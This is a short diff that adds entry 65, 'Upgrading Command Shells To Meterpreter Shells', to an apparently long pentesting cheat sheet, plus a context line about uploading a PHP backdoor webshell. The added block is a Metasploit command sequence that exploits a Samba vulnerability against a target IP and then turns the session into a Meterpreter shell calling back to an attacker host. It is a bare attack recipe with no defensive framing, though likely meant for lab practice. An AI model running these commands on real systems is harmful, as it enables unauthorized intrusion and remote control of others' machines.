@@ -1217,4 +1217,20 @@ upload /usr/share/webshells/php/php-backdoor.php
 https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
 
 ```
+65) Upgrading Command Shells To Meterpreter Shells
+
+```
+ifconfig
+msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOSTS 192.136.51.3
+run
+CTRL + Z
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+set LHOST 192.136.51.2
+run
+sessions 2
+```
+
 
